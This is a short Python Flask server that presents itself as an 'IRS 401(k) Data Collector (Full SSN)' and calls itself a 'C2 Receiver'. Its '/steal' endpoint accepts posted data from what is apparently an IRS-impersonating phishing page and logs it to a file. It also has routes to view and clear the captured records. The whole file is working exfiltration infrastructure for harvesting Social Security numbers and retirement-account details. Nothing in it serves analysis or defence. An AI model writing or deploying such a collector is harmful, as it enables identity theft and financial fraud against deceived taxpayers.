# receiver.py – IRS 401(k) Data Collector (Full SSN)
from flask import Flask, request, jsonify
from datetime import datetime
import json
import os

app = Flask(__name__)
LOG_FILE = "captured_data.txt"

@app.route('/steal', methods=['POST', 'OPTIONS'])
def steal():
    if request.method == 'OPTIONS':
        return '', 200
    data = request.get_json()
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with open(LOG_FILE, 'a') as f:
        f.write(f"\n{'='*50}\n")
        f.write(f"[{timestamp}] CAPTURE\n")
        f.write(f"{'='*50}\n")
        for key, value in data.items():
            f.write(f"{key}: {value}\n")
        f.write("\n")
    print(f"\n[{timestamp}] CAPTURED:")
    for key, value in data.items():
        if key == 'data' and isinstance(value, dict):
            for k, v in value.items():
                print(f"  {k}: {v}")
        else:
            print(f"  {key}: {value}")
    print("-" * 40)
    return jsonify({"status": "received"}), 200

@app.route('/view', methods=['GET'])
def view():
    if os.path.exists(LOG_FILE):
        with open(LOG_FILE, 'r') as f:
            return f.read().replace('\n', '<br>')
    return "No data yet."

@app.route('/clear', methods=['POST'])
def clear():
    if os.path.exists(LOG_FILE):
        os.remove(LOG_FILE)
    return jsonify({"status": "cleared"}), 200

if __name__ == '__main__':
    print("[+] IRS 401(k) C2 Receiver running on port 8080")
    print("[+] View captured data: http://localhost:8080/view")
    app.run(host='0.0.0.0', port=8080, debug=False)
